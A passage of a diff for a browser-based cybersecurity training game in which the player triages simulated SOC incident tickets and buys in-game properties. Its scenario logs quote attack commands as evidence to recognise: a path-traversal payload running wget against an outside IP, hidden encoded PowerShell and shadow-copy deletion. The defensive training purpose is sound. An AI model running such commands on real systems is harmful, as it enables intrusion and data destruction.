+          desc: 'Extended critical infrastructure defense. Huge payout if you manage burnout.'
+        }
+      ];
+
+      const PROPERTIES = [
+        {
+          id: 'studio_condo',
+          name: 'Downtown Tech Studio Condo',
+          category: 'Starter Residence',
+          price: 1800,
+          dailyIncome: 65,
+          perkText: '-4% Daily Stress Carryover',
+          stressReduction: 4,
+          accent: '#38bdf8',
+          desc: 'Walking distance to the SOC office with gigabit fiber and blackout curtains for post-on-call sleep.'
+        },
+        {
+          id: 'homelab_rack',
+          name: '42U Enterprise Home Lab & GPU Node',
+          category: 'Tech Infrastructure',
+          price: 3200,
+          dailyIncome: 135,
+          perkText: '+$35 Bonus per Solved Ticket',
+          ticketBonusBoost: 35,
+          accent: '#10b981',
+          desc: 'Dedicated threat-hunting sandbox and automated bug-bounty node generating daily research payouts.'
+        },
+        {
+          id: 'rental_duplex',
+          name: 'Suburban Rental Duplex',
+          category: 'Cashflow Real Estate',
+          price: 6500,
+          dailyIncome: 290,
+          perkText: 'Steady Rental Cashflow',
+          stressReduction: 0,
+          accent: '#f59e0b',
+          desc: 'Two fully leased units occupied by local software engineers. Reliable daily passive cashflow.'
+        },
+        {
+          id: 'smart_home',
+          name: 'Automated Smart Home & Sauna',
+          category: 'Luxury Residence',
+          price: 11000,
+          dailyIncome: 420,
+          perkText: '-10% Daily Stress Carryover',
+          stressReduction: 10,
+          accent: '#a855f7',
+          desc: 'Biometric security, home spa, and zero-commute remote command center.'
+        },
+        {
+          id: 'colo_cage',
+          name: 'Tier-3 Data Center Colocation Cage',
+          category: 'Commercial Infrastructure',
+          price: 18500,
+          dailyIncome: 820,
+          perkText: '+$60 Bonus per Solved Ticket',
+          ticketBonusBoost: 60,
+          accent: '#06b6d4',
+          desc: 'Redundant BGP-routed server racks leased out to fintech startups for encrypted backups.'
+        },
+        {
+          id: 'cyber_compound',
+          name: 'Off-Grid Mountain Security Compound',
+          category: 'Endgame Estate',
+          price: 35000,
+          dailyIncome: 1650,
+          perkText: '-15% Stress & +$100 Ticket Bonus',
+          stressReduction: 15,
+          ticketBonusBoost: 100,
+          accent: '#f43f5e',
+          desc: 'Solar-microgrid sanctuary with private heli-pad, SCIF vault, and global threat intelligence feeds.'
+        }
+      ];
+
+      // =========================================================================
+      // 2. REALISTIC IT & CYBERSECURITY INCIDENT SCENARIO DATABASE
+      // =========================================================================
+      const SCENARIOS = [
+        {
+          id: 'INC-1041',
+          severity: 'CRITICAL',
+          sevColor: 'rose',
+          category: 'Email Security / BEC',
+          title: 'Urgent Executive Wire Transfer Request',
+          description: 'The CFO received an urgent email purportedly from the CEO requesting an immediate $84,500 wire transfer to close a confidential acquisition.',
+          rawLog: `Return-Path: <ceo-office@acmecorp-holdings.co>\nFrom: "Marcus Vance (CEO)" <mvance@acmecorp.com>\nReply-To: settlement-desk@acmecorp-holdings.co\nAuthentication-Results: spf=fail (sender IP 91.214.124.88) dkim=none\nSubject: URGENT: Confidential Wire - Do Not Discuss on Slack\nAttachment: Wire_Instructions_Q4.pdf.iso`,
+          iocs: {
+            '91.214.124.88': 'MALICIOUS [Score 98/100]: Bulletproof hosting ASN in Eastern Europe. Known Business Email Compromise (BEC) relay.',
+            'acmecorp-holdings.co': 'MALICIOUS [Registered 4 hours ago]: Typosquatted lookalike domain impersonating acmecorp.com.',
+            'Wire_Instructions_Q4.pdf.iso': 'CRITICAL MALWARE: ISO disk image smuggling AsyncRAT payload.'
+          },
+          hint: 'Check the Authentication-Results header (SPF/DKIM), compare Return-Path/Reply-To against acmecorp.com, and notice the double-extension .pdf.iso attachment.',
+          coworkerReplies: {
+            elena: 'Look at the sender domain in Reply-To: acmecorp-holdings.co was registered 4 hours ago! That .pdf.iso file is an AsyncRAT dropper—block it at the gateway immediately.',
+            marcus: 'Our mail gateway flagged spf=fail from 91.214.124.88. Do NOT forward that .iso file internally or it will trigger endpoint execution.',
+            priya: 'Classic CEO fraud / BEC lure. Quarantine the message across all mailboxes, block the lookalike domain, and call the CFO on a verified phone line.'
+          },
+          choices: [
+            {
+              text: 'Quarantine email globally, block acmecorp-holdings.co & 91.214.124.88, and warn CFO out-of-band',
+              isCorrect: true,
+              explanation: 'Spot-on BEC defense! SPF failed, Reply-To spoofs the CEO via a lookalike domain, and .pdf.iso is a classic malware dropper.',
+              secDelta: +4,
+              repDelta: +45,
+              stressDelta: +5,
+              payBonus: 95
+            },
+            {
+              text: 'Forward the .pdf.iso attachment to Accounting so they can review the wire instructions',
+              isCorrect: false,
+              explanation: 'You just spread a malicious AsyncRAT ISO dropper directly into the Finance department!',
+              secDelta: -18,
+              repDelta: -30,
+              stressDelta: +18,
+              payBonus: 0
+            },
+            {
+              text: 'Close ticket as safe because the display name says "Marcus Vance (CEO)"',
+              isCorrect: false,
+              explanation: 'Display names are trivially forged. Always inspect Return-Path, Reply-To, and SPF/DKIM headers.',
+              secDelta: -15,
+              repDelta: -25,
+              stressDelta: +15,
+              payBonus: 0
+            }
+          ]
+        },
+        {
+          id: 'INC-1078',
+          severity: 'HIGH',
+          sevColor: 'rose',
+          category: 'Endpoint Detection (EDR)',
+          title: 'Encoded PowerShell C2 Beacon on HR Workstation',
+          description: 'EDR flagged workstation HR-LT-19 spawning a hidden Base64 PowerShell process attempting outbound TLS connections to an unrecognized IP.',
+          rawLog: `Host: HR-LT-19 | User: j.miller\nParent: WINWORD.EXE -> Child: powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...\nDst IP: 185.220.101.44:443 (JA3: e7d705a3286e19ea42f587b344ee6865)\nBeacon Interval: 60s jitter 10%`,
+          iocs: {
+            '185.220.101.44': 'MALICIOUS [Cobalt Strike C2]: Flagged by 42/68 threat vendors as active Cobalt Strike TeamServer.',
+            'HR-LT-19': 'INTERNAL ASSET: Human Resources laptop with access to PII payroll database.',
+            'powershell.exe': 'SUSPICIOUS EXECUTION: Hidden window + Base64 encoded payload spawned by Microsoft Word.'
+          },
+          hint: 'Look at the parent-child process tree (WINWORD.EXE spawning hidden encoded PowerShell) and scan outbound IP 185.220.101.44 in Threat Intel.',
+          coworkerReplies: {
+            elena: 'Just checked 185.220.101.44—that is a known Cobalt Strike TeamServer with a 60-second beacon interval. Treat HR-LT-19 as actively compromised!',
+            marcus: 'Do NOT reboot the laptop—that wipes volatile RAM! Use EDR network isolation to cut its VLAN access while keeping the memory state intact.',
+            priya: 'Since HR-LT-19 has payroll PII access, isolate the host in EDR right away, sinkhole 185.220.101.44 on the firewall, and kill j.miller’s active tokens.'
+          },
+          choices: [
+            {
+              text: 'Network-isolate HR-LT-19 via EDR, block 185.220.101.44 at firewall, and revoke user session',
+              isCorrect: true,
+              explanation: 'Textbook containment! Isolating the host stops lateral movement while preserving volatile memory for forensic triage.',
+              secDelta: +5,
+              repDelta: +55,
+              stressDelta: +8,
+              payBonus: 120
+            },
+            {
+              text: 'Remotely reboot HR-LT-19 to clear the PowerShell process from RAM',
+              isCorrect: false,
+              explanation: 'Rebooting destroys volatile forensic evidence and persistence mechanisms (scheduled tasks/registry keys) will simply re-trigger.',
+              secDelta: -12,
+              repDelta: -20,
+              stressDelta: +14,
+              payBonus: 0
+            },
+            {
+              text: 'Allow traffic — Port 443 is standard HTTPS web browsing',
+              isCorrect: false,
+              explanation: 'Attackers routinely tunnel Cobalt Strike C2 over port 443. WINWORD.EXE spawning hidden encoded PowerShell is a classic compromise.',
+              secDelta: -22,
+              repDelta: -35,
+              stressDelta: +20,
+              payBonus: 0
+            }
+          ]
+        },
+        {
+          id: 'INC-1102',
+          severity: 'MEDIUM',
+          sevColor: 'amber',
+          category: 'IT Operations / Change Mgmt',
+          title: 'Automated Vulnerability Scanner Spike on Production DB',
+          description: 'IDS triggered 14,000 SYN port-scan alerts targeting the primary PostgreSQL cluster from an internal IP address.',
+          rawLog: `Alert: ET SCAN Potential SSH/Postgres Brute Force & Port Sweep\nSrc IP: 10.10.5.22 (Hostname: nessus-prod-01.corp.local)\nDst IP: 10.10.20.15 (db-cluster-primary)\nChange Ticket: CHG-8841 (Approved Scheduled Weekly Compliance Scan)\nUser Context: svc_qualys_scanner`,
+          iocs: {
+            '10.10.5.22': 'TRUSTED INTERNAL SCANNER: Authorized Nessus/Qualys vulnerability scanner appliance.',
+            'CHG-8841': 'VALID CHANGE REQUEST: Approved maintenance window 13:00-15:00 UTC.',
+            '10.10.20.15': 'INTERNAL DB: Production PostgreSQL server.'
+          },
+          hint: 'Inspect the source hostname (nessus-prod-01.corp.local) and look up CHG-8841 before taking disruptive firewall actions on an internal IP.',
+          coworkerReplies: {
+            elena: '10.10.5.22 is our own internal Qualys/Nessus scanner appliance, not an external threat actor. No malicious IOCs here.',
+            marcus: 'Please don’t block 10.10.5.22! I approved CHG-8841 for the weekly compliance scan window—blacklisting it will break our audit pipeline.',
+            priya: 'Good catch verifying context first. Confirm CHG-8841 is active and close/tune this alert as an authorized false positive.'
+          },
+          choices: [
+            {
+              text: 'Verify CHG-8841 maintenance window and tune/suppress alert as Authorized False Positive',
+              isCorrect: true,
+              explanation: 'Great verification! Always cross-check internal scanner IPs against approved Change Management tickets before blocking internal infrastructure.',
+              secDelta: +2,
+              repDelta: +35,
+              stressDelta: +3,
+              payBonus: 65
+            },
+            {
+              text: 'Blacklist 10.10.5.22 across all switches and shut down the database interface',
+              isCorrect: false,
+              explanation: 'You just caused a self-inflicted production outage by blocking your own authorized compliance scanner!',
+              secDelta: -10,
+              repDelta: -30,
+              stressDelta: +16,
+              payBonus: 0
+            },
+            {
+              text: 'Escalate as an active nation-state zero-day intrusion to the CISO',
+              isCorrect: false,
+              explanation: 'Crying wolf on an approved change ticket hurts SOC credibility. Checking the source hostname first saves everyone time.',
+              secDelta: -4,
+              repDelta: -15,
+              stressDelta: +10,
+              payBonus: 0
+            }
+          ]
+        },
+        {
+          id: 'INC-1149',
+          severity: 'HIGH',
+          sevColor: 'rose',
+          category: 'Cloud Security / AWS IAM',
+          title: 'Publicly Exposed AWS S3 Bucket Detected',
+          description: 'Cloud Security Posture Management (CSPM) detected an S3 bucket ACL modified to allow AllUsers READ access.',
+          rawLog: `EventName: PutBucketAcl | CloudTrail User: arn:aws:iam::491029384:user/dev-intern\nBucket: acme-customer-kyc-documents-prod\nACL Grant: URI=http://acs.amazonaws.com/groups/global/AllUsers (READ)\nObject Count: 142,810 PDF/JPG files | Access Logs: 3 external GET requests`,
+          iocs: {
+            'acme-customer-kyc-documents-prod': 'SENSITIVE BUCKET: Contains customer passports, SSNs, and tax forms.',
+            'dev-intern': 'IAM USER: Developer account lacking MFA enforcement on CLI keys.'
+          },
+          hint: 'Notice both the bucket sensitivity (customer KYC documents) and the IAM user (dev-intern) whose CLI access keys were used to open the ACL.',
+          coworkerReplies: {
+            elena: 'Automated cloud bots index public S3 buckets within minutes—and 3 external GET requests already hit it. Lock the ACL immediately.',
+            marcus: 'Whatever you do, don’t delete the bucket! Production apps rely on it—just enable S3 Block Public Access and rotate dev-intern’s IAM keys.',
+            priya: 'Treat this as a potential PII exposure: flip S3 Block Public Access on right now, revoke dev-intern’s CLI keys, and pull S3 server access logs.'
+          },
+          choices: [
+            {
+              text: 'Enable S3 Block Public Access immediately, rotate dev-intern keys, and audit access logs',
+              isCorrect: true,
+              explanation: 'Rapid cloud containment! Locking down the bucket stops data exfiltration immediately while key rotation prevents re-opening.',
+              secDelta: +5,
+              repDelta: +50,
+              stressDelta: +7,
+              payBonus: 110
+            },
+            {
+              text: 'Email the dev intern and ask them to fix it next week during sprint cleanup',
+              isCorrect: false,
+              explanation: 'Leaving 142,000 customer KYC records publicly readable for a week guarantees a massive GDPR/regulatory data breach.',
+              secDelta: -25,
+              repDelta: -40,
+              stressDelta: +20,
+              payBonus: 0
+            },
+            {
+              text: 'Delete the entire S3 bucket immediately without backing up the files',
+              isCorrect: false,
+              explanation: 'Destroying production customer records violates data integrity and availability! Revoke public ACLs rather than wiping production data.',
+              secDelta: -15,
+              repDelta: -30,
+              stressDelta: +15,
+              payBonus: 0
+            }
+          ]
+        },
+        {
+          id: 'INC-1193',
+          severity: 'CRITICAL',
+          sevColor: 'rose',
+          category: 'Ransomware / Active Directory',
+          title: 'Mass SMB File Encryption & Shadow Copy Deletion',
+          description: 'File server FS-CORP-02 reports 4,200 files renamed with .lockbit3 extension within 90 seconds.',
+          rawLog: `Host: FS-CORP-02 | Process: vssadmin.exe delete shadows /all /quiet\nSMB Session Source: 10.24.99.14 (IT-ADMIN-JUMP01)\nAccount Used: svc_backup_admin (Domain Admin privileges)\nHash: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069`,
+          iocs: {
+            '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069': 'CRITICAL RANSOMWARE: Known LockBit 3.0 affiliate encryptor binary.',
+            '10.24.99.14': 'COMPROMISED JUMP HOST: Source of lateral SMB encryption.',
+            'svc_backup_admin': 'COMPROMISED PRIVILEGED ACCOUNT: Kerberoasted service account.'
+          },
+          hint: 'Look at ALL three compromised pivot points in the log: the target file server (FS-CORP-02), the source jump host (10.24.99.14), and the Domain Admin account (svc_backup_admin).',
+          coworkerReplies: {
+            elena: 'That SHA-256 hash matches a known LockBit 3.0 encryptor binary, and vssadmin.exe already wiped shadow copies. Time is critical!',
+            marcus: 'The encryption is coming over SMB from jump host 10.24.99.14. Cut network isolation on both FS-CORP-02 and IT-ADMIN-JUMP01 immediately!',
+            priya: 'All hands on deck: isolate BOTH hosts, disable svc_backup_admin in Active Directory so it can’t jump to Domain Controllers, and declare a P1 incident.'
+          },
+          choices: [
+            {
+              text: 'Isolate FS-CORP-02 & IT-ADMIN-JUMP01, disable svc_backup_admin in AD, and trigger IR playbook',
+              isCorrect: true,
+              explanation: 'Heroic incident response! Cutting SMB connectivity and disabling the compromised Domain Admin service account stops domain-wide encryption.',
+              secDelta: +6,
+              repDelta: +70,
+              stressDelta: +12,
+              payBonus: 160
+            },
+            {
+              text: 'Open the ransom note .txt file and negotiate payment using company funds',
+              isCorrect: false,
+              explanation: 'Never negotiate before containing active encryption! Meanwhile, the binary is still encrypting your remaining servers.',
+              secDelta: -25,
+              repDelta: -45,
+              stressDelta: +22,
+              payBonus: 0
+            },
+            {
+              text: 'Run Windows Disk Cleanup on FS-CORP-02 to free up space',
+              isCorrect: false,
+              explanation: 'Disk Cleanup does nothing against active ransomware and wastes critical seconds while terabytes of shares are encrypted.',
+              secDelta: -22,
+              repDelta: -35,
+              stressDelta: +20,
+              payBonus: 0
+            }
+          ]
+        },
+        {
+          id: 'INC-1215',
+          severity: 'MEDIUM',
+          sevColor: 'amber',
+          category: 'Identity & Access (IAM)',
+          title: 'Impossible Travel & MFA Fatigue Push Bombing',
+          description: 'Okta logs show 28 denied MFA push notifications followed by 1 approved push for VP of Sales from an anomalous ASN.',
+          rawLog: `User: s.connors@acmecorp.com (VP Sales)\n08:12 UTC: Login Success from Chicago, US (Comcast Residential)\n08:19 UTC: 28x MFA Push Denied -> 1x MFA Push Approved\n08:19 UTC: Login Success from Lagos, NG (IP: 102.89.44.12 - Tor/VPN Exit)`,
+          iocs: {
+            '102.89.44.12': 'SUSPICIOUS PROXY: Residential proxy / VPN exit node associated with credential stuffing.',
+            's.connors@acmecorp.com': 'HIGH-VALUE TARGET: Executive mailbox with M&A documents.'
+          },
+          hint: 'Compare the timestamps and geolocation: Chicago at 08:12 UTC vs. Lagos 7 minutes later after 28 denied MFA pushes (classic MFA fatigue).',
+          coworkerReplies: {
+            elena: '102.89.44.12 is a known residential proxy exit node used by credential-stuffing crews. The VP got push-bombed until they tapped Approve.',
+            marcus: 'Even if you reset the password, existing OAuth/Okta session cookies stay valid unless you explicitly revoke all active sessions!',
+            priya: 'Revoke all Okta tokens immediately, force a password + MFA reset, and inspect the VP’s Exchange inbox rules for stealth auto-forwarding.'
+          },
+          choices: [
+            {
+              text: 'Revoke all active Okta sessions, force password + MFA re-enrollment, and check inbox rules',
+              isCorrect: true,
+              explanation: 'Classic MFA fatigue attack! Revoking tokens boots the attacker out, and checking inbox rules catches hidden email-forwarding persistence.',
+              secDelta: +4,
+              repDelta: +45,
+              stressDelta: +6,
+              payBonus: 90
+            },
+            {
+              text: 'Ignore it because the user eventually approved the MFA prompt',
+              isCorrect: false,
+              explanation: 'Users often tap "Approve" just to make the phone stop buzzing at 3 AM. Impossible travel (Chicago to Lagos in 7 minutes) proves compromise.',
+              secDelta: -16,
+              repDelta: -25,
+              stressDelta: +15,
+              payBonus: 0
+            },
+            {
+              text: 'Disable MFA completely on the VP’s account so they aren’t bothered by prompts',
+              isCorrect: false,
+              explanation: 'Disabling MFA hands the attacker permanent unrestricted access to an executive account!',
+              secDelta: -24,
+              repDelta: -40,
+              stressDelta: +18,
+              payBonus: 0
+            }
+          ]
+        },
+        {
+          id: 'INC-1260',
+          severity: 'LOW',
+          sevColor: 'cyan',
+          category: 'IT Helpdesk / Endpoint Hardware',
+          title: 'Unrecognized USB Storage Device Blocked by DLP',
+          description: 'Endpoint DLP blocked a USB mass-storage device plugged into a conference room kiosk PC.',
+          rawLog: `Host: CONF-RM-B-PC | Event: USB_DEVICE_BLOCKED\nVendorID: 0x0781 (SanDisk) | Product: Ultra Dual Drive 64GB\nVolume Label: "Q4_ALL_HANDS_DECK"\nUser Logged In: guest_presenter | Malware Scan: Clean (0 detections)`,
+          iocs: {
+            'CONF-RM-B-PC': 'KIOSK TERMINAL: Isolated guest VLAN with no access to corporate file shares.',
+            '0x0781': 'HARDWARE VENDOR: Standard SanDisk flash drive (not a BadUSB HID keyboard).'
+          },
+          hint: 'Check the DLP status (USB_DEVICE_BLOCKED), the malware scan result (Clean), and which VLAN the conference room kiosk sits on.',
+          coworkerReplies: {
+            elena: 'VendorID 0x0781 is a standard SanDisk mass-storage drive—not a spoofed HID keyboard injector—and AV scan came back clean.',
+            marcus: 'CONF-RM-B-PC is locked down on our isolated Guest VLAN with zero route to corporate file servers, and DLP already blocked the mount.',
+            priya: 'Low-severity operational ticket: verify the DLP block held and point the guest presenter to our approved browser upload portal.'
+          },
+          choices: [
+            {
+              text: 'Confirm DLP block held, verify kiosk isolation, and guide presenter to use approved cloud share',
+              isCorrect: true,
+              explanation: 'Clean IT/SecOps handling! DLP did its job, the device wasn’t a malicious HID injector, and you provided a secure business workaround.',
+              secDelta: +2,
+              repDelta: +30,
+              stressDelta: +3,
+              payBonus: 55
+            },
+            {
+              text: 'Shut down the entire corporate Wi-Fi network across all floors',
+              isCorrect: false,
+              explanation: 'Massive overreaction! DLP already blocked the USB drive on an isolated guest kiosk.',
+              secDelta: -8,
+              repDelta: -25,
+              stressDelta: +14,
+              payBonus: 0
+            },
+            {
+              text: 'Disable DLP USB blocking policy globally so presenters never get blocked',
+              isCorrect: false,
+              explanation: 'Disabling USB controls company-wide opens the door to BadUSB and malware drops.',
+              secDelta: -18,
+              repDelta: -30,
+              stressDelta: +14,
+              payBonus: 0
+            }
+          ]
+        },
+        {
+          id: 'INC-1304',
+          severity: 'CRITICAL',
+          sevColor: 'rose',
+          category: 'Vulnerability Management / Zero-Day',
+          title: 'Active Exploitation of Critical VPN Gateway CVE',
+          description: 'CISA KEV advisory warns of unauthenticated RCE (CVSS 9.8) actively exploited in the wild on your edge SSL-VPN appliance.',
+          rawLog: `Appliance: vpn-gw-east.acmecorp.com (Firmware v7.2.1 - VULNERABLE)\nWAF Log: POST /remote/hostcheck_validate HTTP/1.1 -> Status 200 (24 attempts)\nSrc IP: 45.155.205.91 | Payload: ../../../bin/sh -c "wget http://45.155.205.91/x86"\nVendor Hotfix v7.2.4: Available Now (Requires 4-min appliance reboot)`,
+          iocs: {
+            '45.155.205.91': 'CRITICAL EXPLOIT SCANNER: Actively scanning and dropping Mirai/webshells on unpatched VPNs.',
+            'vpn-gw-east.acmecorp.com': 'EDGE APPLIANCE: Vulnerable to CVSS 9.8 pre-auth Remote Code Execution.'
+          },
+          hint: 'Notice the HTTP 200 status codes on /remote/hostcheck_validate—meaning exploit payloads already reached the vulnerable v7.2.1 appliance!',
+          coworkerReplies: {
+            elena: '45.155.205.91 is mass-exploiting this CVSS 9.8 VPN bug right now and dropping persistent webshells in /remote/ directories.',
+            marcus: 'Because the WAF returned Status 200 on 24 exploit requests, just blocking the IP isn’t enough—we MUST apply hotfix v7.2.4 immediately.',
+            priya: 'Patch vpn-gw-east to v7.2.4 right now, block 45.155.205.91 at the edge, and audit the appliance filesystem for dropped webshells.'
+          },
+          choices: [
+            {
+              text: 'Approve emergency change window to apply hotfix v7.2.4, block 45.155.205.91, and hunt for webshells',
+              isCorrect: true,
+              explanation: 'Decisive zero-day response! A 4-minute maintenance reboot beats a total network breach, and checking for webshells ensures no persistence remains.',
+              secDelta: +6,
+              repDelta: +65,
+              stressDelta: +10,
+              payBonus: 150
+            },
+            {
+              text: 'Wait 3 weeks until the next scheduled monthly Patch Tuesday',
+              isCorrect: false,
+              explanation: 'With active exploit payloads already hitting your VPN gateway, waiting 3 weeks guarantees full perimeter compromise.',
+              secDelta: -25,
+              repDelta: -40,
+              stressDelta: +20,
+              payBonus: 0
+            },
+            {
+              text: 'Only block 45.155.205.91 and leave the VPN firmware unpatched',
+              isCorrect: false,
+              explanation: 'Blocking one IP while leaving a CVSS 9.8 vulnerability unpatched on the public internet will be bypassed within minutes by botnets.',
+              secDelta: -14,
+              repDelta: -20,
+              stressDelta: +12,
+              payBonus: 0
+            }
+          ]
+        }
+      ];
+
+      const SHIFT_PHASES = [
+        { time: '09:00 AM', name: 'Morning SIEM & Email Triage' },
+        { time: '12:30 PM', name: 'Midday Escalations & Cloud Alerts' },
+        { time: '03:45 PM', name: 'Afternoon Audits & Vulnerability Ops' },
+        { time: '06:15 PM', name: 'Late Shift / On-Call Incident' }
+      ];
+
+      const AMBIENT_SOC_LOGS = [
+        '[SIEM] Heartbeat OK from 1,420 EDR agents across 3 regions.',
+        '[FIREWALL] Dropped 1,842 inbound port-scan packets on WAN-1.',
+        '[OKTA] Conditional Access policy verified 412 employee logins.',
+        '[PROXY] Blocked adware tracker domain on Marketing subnet.',
+        '[BACKUP] Immutable Veeam snapshot verified (SHA-256 match).',
+        '[DLP] Outbound email encryption check passed for Legal dept.',
+        '[IDS] Snort ruleset updated to v2026.11.16-r2.'
+      ];
+
+      // =========================================================================
+      // 3. PERSISTENT SAVE STATE (localStorage)
+      // =========================================================================
+      const STORAGE_KEY = 'cybershift_career_save_v1';
+
+      function getDefaultCareer() {
+        return {
+          bank: 2500,
+          lifetimeEarnings: 2500,
+          repXP: 0,
+          roleIndex: 0,
+          totalDaysWorked: 0,
+          ticketsResolved: 0,
+          ownedProperties: [], // array of property ids
+          payHistory: [], // array of paycheck summary objects
+          securityScore: 95,
+          stress: 12
+        };
+      }
+
+      function loadCareer() {
+        try {
+          const raw = localStorage.getItem(STORAGE_KEY);
+          if (!raw) return getDefaultCareer();
+          const parsed = JSON.parse(raw);
+          return { ...getDefaultCareer(), ...parsed };
+        } catch (e) {
+          return getDefaultCareer();
+        }
+      }
+
+      function saveCareer() {
+        try {
+          localStorage.setItem(STORAGE_KEY, JSON.stringify(career));
+        } catch (e) {
+          // Safe fallback if storage restricted
+        }
+      }
+
+      let career = loadCareer();
+
+      // Active Rotation Session State (in-memory during active shift)
+      let selectedRotationDays = 5;
+      let inActiveRotation = false;
+      let currentRotationDay = 1;
+      let currentPhaseIndex = 0;
+      let todayIncidentBonuses = 0;
+      let todayBreachesOccurred = false;
+      let usedScenarioIds = [];
+      let currentTicket = null;
+      let ticketResolved = false;
+      let hintsRemainingToday = 2;
+      let pingsRemainingToday = 2;
+      let hintUsedThisTicket = false;
+      let pingedCoworkersThisTicket = [];
+
+      // =========================================================================
+      // 4. HELPER CALCULATIONS (PASSIVE INCOME & PERKS)
+      // =========================================================================
+      function getPassiveDailyIncome() {
+        return career.ownedProperties.reduce((sum, propId) => {
+          const prop = PROPERTIES.find((p) => p.id === propId);
+          return sum + (prop ? prop.dailyIncome : 0);
+        }, 0);
+      }
+
+      function getTicketBonusBoost() {
+        return career.ownedProperties.reduce((sum, propId) => {
+          const prop = PROPERTIES.find((p) => p.id === propId);
+          return sum + (prop && prop.ticketBonusBoost ? prop.ticketBonusBoost : 0);
+        }, 0);
+      }
+
+      function getDailyStressReduction() {
+        return career.ownedProperties.reduce((sum, propId) => {
+          const prop = PROPERTIES.find((p) => p.id === propId);
+          return sum + (prop && prop.stressReduction ? prop.stressReduction : 0);
+        }, 0);
+      }
+
+      function formatMoney(num) {
+        const sign = num < 0 ? '-' : '';
+        return `${sign}$${Math.abs(Math.round(num)).toLocaleString()}`;
+      }
+
+      // =========================================================================
+      // 5. UI RENDERING — TOP HUD & NAVIGATION
+      // =========================================================================
+      function updateHUD() {
+        const role = ROLES[career.roleIndex] || ROLES[0];
+        document.getElementById('hudRoleBadge').textContent = role.title;
+        document.getElementById('hudTotalDays').textContent = career.totalDaysWorked;
+        document.getElementById('hudPassiveIncome').textContent = `+${formatMoney(getPassiveDailyIncome())}/day`;
+        document.getElementById('hudBankBalance').textContent = formatMoney(career.bank);
+        document.getElementById('hudPropertyCount').textContent = career.ownedProperties.length;
+      }
+
+      const navTabBtns = document.querySelectorAll('.nav-tab-btn');
+      const viewWorkstation = document.getElementById('viewWorkstation');
+      const viewRealEstate = document.getElementById('viewRealEstate');
+      const viewCareer = document.getElementById('viewCareer');
+
+      function switchView(viewName) {
+        navTabBtns.forEach((btn) => {
+          const active = btn.dataset.nav === viewName;
+          btn.className = active
+            ? 'nav-tab-btn flex-1 md:flex-initial px-3.5 py-1.5 rounded-lg text-xs sm:text-sm font-semibold transition-all bg-slate-800 text-emerald-400 shadow-xs flex items-center justify-center gap-1.5'
+            : 'nav-tab-btn flex-1 md:flex-initial px-3.5 py-1.5 rounded-lg text-xs sm:text-sm font-medium text-slate-400 hover:text-white transition-all flex items-center justify-center gap-1.5';
+        });
+
+        viewWorkstation.classList.toggle('hidden', viewName !== 'workstation');
+        viewRealEstate.classList.toggle('hidden', viewName !== 'realestate');
+        viewCareer.classList.toggle('hidden', viewName !== 'career');
+
+        if (viewName === 'realestate') renderRealEstateMarket();
+        if (viewName === 'career') renderCareerLedger();
+        if (viewName === 'workstation' && !inActiveRotation) renderShiftSetup();
+      }
+
+      navTabBtns.forEach((btn) => {
+        btn.addEventListener('click', () => switchView(btn.dataset.nav));
+      });
+
+      // =========================================================================
+      // 6. SHIFT SETUP RENDERING & ROTATION INITIALIZATION
+      // =========================================================================
+      function renderShiftSetup() {
+        const role = ROLES[career.roleIndex] || ROLES[0];
+        const nextRole = ROLES[career.roleIndex + 1];
+        document.getElementById('setupRoleName').textContent = role.title;
+        document.getElementById('setupDailyRate').textContent = `${formatMoney(role.dailyPay)} / day`;
+        document.getElementById('setupRepXP').textContent = nextRole
+          ? `${career.repXP} / ${nextRole.minRep} XP`
+          : `${career.repXP} XP (MAX RANK)`;
+
+        // Render Shift Length Cards
+        const grid = document.getElementById('shiftLengthGrid');
+        grid.innerHTML = '';
+        ROTATION_OPTIONS.forEach((opt) => {
+          const isSelected = selectedRotationDays === opt.days;
+          const card = document.createElement('button');
+          card.type = 'button';
+          card.className = `text-left p-4 rounded-xl border transition-all flex flex-col justify-between ${
+            isSelected
+              ? 'bg-emerald-500/10 border-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.15)]'
+              : 'bg-slate-950/80 border-slate-800 hover:border-slate-700'
+          }`;
+          card.innerHTML = `
+            <div>
+              <div class="flex items-center justify-between gap-2">
+                <span class="text-xs font-mono-code font-bold px-2 py-0.5 rounded bg-slate-800 text-cyan-300">${opt.tag}</span>
+                <span class="text-xs font-mono-code font-bold text-emerald-400">+${formatMoney(opt.bonus)} Bonus</span>
+              </div>
+              <h4 class="font-bold text-sm sm:text-base text-white mt-2.5">${opt.label}</h4>
+              <p class="text-xs text-slate-400 mt-1.5 leading-relaxed">${opt.desc}</p>
+            </div>
+            <div class="mt-4 pt-2.5 border-t border-slate-800/80 flex items-center justify-between text-[11px] font-mono-code">
+              <span class="text-slate-400">Est. Base:</span>
+              <span class="text-slate-200 font-semibold">${formatMoney(role.dailyPay * opt.days)}</span>
+            </div>
+          `;
+          card.addEventListener('click', () => {
+            selectedRotationDays = opt.days;
+            renderShiftSetup();
+          });
+          grid.appendChild(card);
+        });
+
+        // Render Role Tier Cards
+        const roleGrid = document.getElementById('roleTierGrid');
+        roleGrid.innerHTML = '';
+        ROLES.forEach((r, idx) => {
+          const unlocked = career.repXP >= r.minRep || idx <= career.roleIndex;
+          const isCurrent = idx === career.roleIndex;
+          const div = document.createElement('div');
+          div.className = `p-4 rounded-xl border ${
+            isCurrent
+              ? 'bg-cyan-500/10 border-cyan-500/60'
+              : unlocked
+              ? 'bg-slate-950/70 border-slate-800'
+              : 'bg-slate-950/40 border-slate-800/60 opacity-60'
+          }`;
+          div.innerHTML = `
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-mono-code font-bold ${isCurrent ? 'text-cyan-400' : unlocked ? 'text-emerald-400' : 'text-slate-500'}">
+                ${isCurrent ? '● ACTIVE TIER' : unlocked ? '✓ UNLOCKED' : `🔒 ${r.minRep} XP REQ`}
+              </span>
+              <span class="text-xs font-mono-code font-bold text-white">${formatMoney(r.dailyPay)}/day</span>
+            </div>
+            <h4 class="font-bold text-sm text-white mt-2">${r.title}</h4>
+            <p class="text-xs text-slate-400 mt-1 leading-relaxed">${r.desc}</p>
+          `;
+          roleGrid.appendChild(div);
+        });
+      }
+
+      document.getElementById('startRotationBtn').addEventListener('click', () => {
+        inActiveRotation = true;
+        currentRotationDay = 1;
+        startNewWorkday();
+      });
+
+      // =========================================================================
